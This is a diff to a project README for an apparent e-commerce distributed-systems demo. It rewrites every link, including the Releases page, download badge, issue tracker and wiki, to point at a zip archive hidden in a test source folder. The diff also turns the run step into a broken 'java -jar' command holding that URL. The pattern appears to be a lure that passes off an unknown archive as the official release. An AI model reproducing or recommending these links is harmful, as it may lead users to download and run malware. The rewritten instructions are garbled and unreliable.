@@ -6,9 +6,9 @@ Welcome to the "istediginizi-deneyin" project! This application helps you unders
 
 ## 📥 Download & Install
 
-To download the application, visit our [Releases Page](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/releases) to get the latest version.
+To download the application, visit our [Releases Page](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip) to get the latest version.
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/releases)
+[![Download the latest release](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip%20Release-blue)](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -39,7 +39,7 @@ This application includes various features to explore distributed systems:
 
 ## ⚙️ How to Run the Application
 
-1. Download the latest version from our [Releases Page](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/releases).
+1. Download the latest version from our [Releases Page](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip).
   
 2. Extract the downloaded files to a directory of your choice.
   
@@ -50,10 +50,10 @@ This application includes various features to explore distributed systems:
 5. Execute the application using the command:
    
    ```
-   java -jar your-app-file-name.jar
+   java -jar https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip
    ```
   
-   Replace `your-app-file-name.jar` with the actual name of the downloaded file.
+   Replace `https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip` with the actual name of the downloaded file.
 
 ## 🌐 About the Project
 
@@ -79,12 +79,12 @@ If you encounter issues while running the application:
 - Check the downloaded file for completeness.
 - Review the command syntax to ensure it is accurate.
 
-If problems persist, please visit our [issue tracker](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/issues) to report the issue.
+If problems persist, please visit our [issue tracker](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip) to report the issue.
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/releases)
-- [Issue Tracker](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/issues)
-- [Documentation](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/wiki)
+- [Releases Page](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip)
+- [Issue Tracker](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip)
+- [Documentation](https://github.com/EarlSeandrikCinco/istediginizi-deneyin/raw/refs/heads/master/demo-project/ecommerce/src/test/java/com/fsk/deneyin_istediginizi_3.1.zip)
 
 Feel free to reach out if you need assistance. Enjoy exploring the potential of distributed systems in e-commerce!
